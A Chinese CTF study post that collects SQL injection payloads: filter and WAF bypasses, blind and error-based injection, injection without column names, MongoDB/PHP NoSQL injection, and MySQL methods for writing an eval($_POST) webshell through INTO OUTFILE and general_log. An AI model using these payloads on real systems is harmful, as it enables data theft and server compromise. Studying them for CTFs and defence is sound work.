---
title: 'SQL注入总结'
date: 2020-03-17
updated: 2020-04-03
category: 'CTF'
tags:
  - 'SQL注入'
lang: 'zh'
draft: false
---
## 常用的绕过手段

### 字符型过滤单引号

-   字符串转换函数绕过

```
char()
```

-   十六进制数绕过

### 过滤=

between, like, <, >，regexp 绕过

```
1 union select 1, table_name from information_schema.tables where table_name = 'users'

select 1, table_name from information_schema.tables where table_name between 'u' and 'v';

select 1, table_name from information_schema.tables where table_name like 'u%';
```

### 注释符

```
# %23
-- 后面要加空格
/**/ 只加前半个也行
;%00 Nullbyte
` Backtick
```

### 过滤逗号

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号

```
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

使用join(连接表的查询结果)

```sql
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b

mysql> SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);
+---+---+---+---+---+
| 1 | 2 | 3 | 4 | 5 |
+---+---+---+---+---+
| 1 | 2 | 3 | 4 | 5 |
+---+---+---+---+---+
1 row in set (0.00 sec)
```

使用like

```sql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'

mysql> select user() like 'r%';
+------------------+
| user() like 'r%' |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)
```

对于 `limit` 可以使用 offset绕过

```sql
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```

### <，>被过滤

-   greatest函数绕过

> greatest(a,b)，返回a和b中较大的那个数

```
# 猜解user()第一个字符的ascii码是否小于等于150时
ascii(mid(user(),1,1)) <= 150
=greatest(ascii(mid(user(),1,1)), 150)=150;
```

### 过滤and，or可以使用&&和||

### 单引号逃逸

-   \\

```
# 用户名为username
SQL> select * from db where name='username\' and passwd=' or 1=1#
```

### 注释符

```
# %23
-- 后面要加空格
/**/ 只加前半个也行
;%00 Nullbyte
` Backtick
```

### 过滤select

利用数值计算盲注或时间盲注

```
|| ascii(mid(user(),1,1) ) = 97 %23
```

### 绕过 information 被过滤

1.  MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了`innodb_table_stats` 和`innodb_index_stats`这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。  
    如果waf掉了`information`我们可以利用这两个表注入数据库名和表名。
2.  参考 [聊一聊bypass information\_schema](https://www.anquanke.com/post/id/193512)

MySQl5.7的新特性

-   sys.schema\_auto\_increment\_columns 该视图的作用简单来说就是用来对表自增ID的监控。
-   schema\_table\_statistics\_with\_buffer,x$schema\_table\_statistics\_with\_buffer

## 盲注

### 延时注入

数据库如下

```
mysql> select * from user;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

测试

```
mysql> select password from user where id=1 and  (select hex(substr(database(), 1,1)) > 20) and sleep(2);
Empty set (2.00 sec)

mysql> select password from user where id=1 and  (select hex(substr(database(), 1,1)) > 89) and sleep(2);
Empty set (0.00 sec)
```

我们这么来理解多语句的and

数据库会每次取出一行数据，然后做判断，首先 `id=1` 成立，然后 判断`(select hex(substr(database(), 1,1)) > 20)`

如果这个成立，就会执行接下来的 `sleep(2)` 如果不成立，那么直接over了。不会有延时

### order by 注入

order by 后的数字可以作为一个注入点

报错注入

```
mysql> select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'
```

时间盲注

```
select * from flag order by 1 and if(1=1,sleep(3), NULL);
```

### limit 注入

在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。

报错注入

```
mysql> select * from users where id>1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
```

时间注入

```
select * from users where id>1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);
```

## 无列名注入

[例题链接](https://buuoj.cn/challenges#[SWPU2019]Web1)

> 过滤了空格和or，并且没办法绕过过滤or
> 
> 同时不知道列名
> 
> payload: `1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'`

这样在不知道列名的情况下，就可以给每一列取一个别名了

```
mysql> select 1,2,3 union select * from user;
+---+-------+--------+
| 1 | 2     | 3      |
+---+-------+--------+
| 1 | 2     | 3      |
| 1 | admin | mysql  |
| 2 | hhh   | 123    |
| 3 | aaaaa | cccccc |
+---+-------+--------+
4 rows in set (0.00 sec)
```

查询

```
mysql> select group_concat(b) from (select 1,2,3 as b union select * from user)a;
+--------------------+
| group_concat(b)    |
+--------------------+
| 3,mysql,123,cccccc |
+--------------------+
1 row in set (0.00 sec)
```

查询两列数据

```
select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;
```

查询一行数据

```
select `2` from (select 1,2,3 union select * from users)a limit 1,1;
```

[无列名注入参考](https://www.jianshu.com/p/6eba3370cfab)

**使用join进行无列名注入**

这样就能依次把列名都爆出来了

```
mysql> select * from user;
+---------+-----------+-----------+
| user_id | user_name | user_pass |
+---------+-----------+-----------+
|       1 | admin     | mysql     |
|       2 | hhh       | 123       |
|       3 | aaaaa     | cccccc    |
+---------+-----------+-----------+
3 rows in set (0.00 sec)

mysql> select*from (select * from user as a join user b)c;
ERROR 1060 (42S21): Duplicate column name 'user_id'
mysql> select*from (select * from user as a join user b using(user_id))c;
ERROR 1060 (42S21): Duplicate column name 'user_name'
```

## nosql注入

以mongodb为例

```
db.collection.find(query, projection)
//query 可选，使用查询操作符指定查询条件
//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）
举例：
//查找username为JrXnm的信息
db.user.find({'username':'JrXnm'})
```

第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。

第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。

PHP永真式注入

```
$data = array(
    'username' =>  $_REQUEST['username'],
    'password' =>  $_REQUEST['password']
); 
$cursor = $collection->find($data);
```

但是由于php松散结构的特性，如果我们\_GET传入的是数组那么，会自动被解析成字典。比如我们输入`?username[$ne]=1&password[$ne]=1`， 就会被解析成：

```
{
    'username': {
        '$ne': '1'
    },
    'password': {
        '$ne': '1'
    }
}
```

这样就能查询到所有用户信息

Js注入

```
$collection = $db->users;
$query_body ="
        function q() {
            var username = '".$_REQUEST["username"]."';
            var password = '".$_REQUEST["password"]."';if(username == 'secret_user'&&password == 'secret_password') return true; else{ return false;}}
"; 
$result = $collection->find(array('$where'=>$query_body));
$count = $result->count();
if($count>0){
    echo $doc_succeed->saveHTML();
}
```

`$where`操作符表示执行其中的Js内容，返回True的话返回所有内容。

我们可以看到我们可以注入使得Js代码提前返回True

payload：`?username=qwer&password= 1';return true;var qwer='1`

## MySQL利用方式

### 写shell

#### 联合查询写shell

```
UNION+ALL+SELECT+1,2,’<? phpinfo(); ?>’ into outfile ‘G:/2.txt’ %23
```

#### 非联合查询写shell

```
http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘<? phpinfo(); ?>’%23
```

#### 使用日志写shell

```
set global general_log = on;
开启日志监测，一般是关闭的，如果一直开，文件会很大的。

set global general_log_file = ‘G:/2.txt’;
这里设置我们需要写入的路径就可以了。

select ‘<?php eval($_POST[‘shiyan’]);?>’;
查询一个一句话，这个时候log日志里就会记录这个。

set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;
结束后，再修改为原来的路径。

set global general_log = off;
关闭下日志记录。
```

#### 延时注入写shell

```
select sleep(2),'<?php @eval($_POST[cmd]); ?>' into outfile 'd:\\success.txt';
```
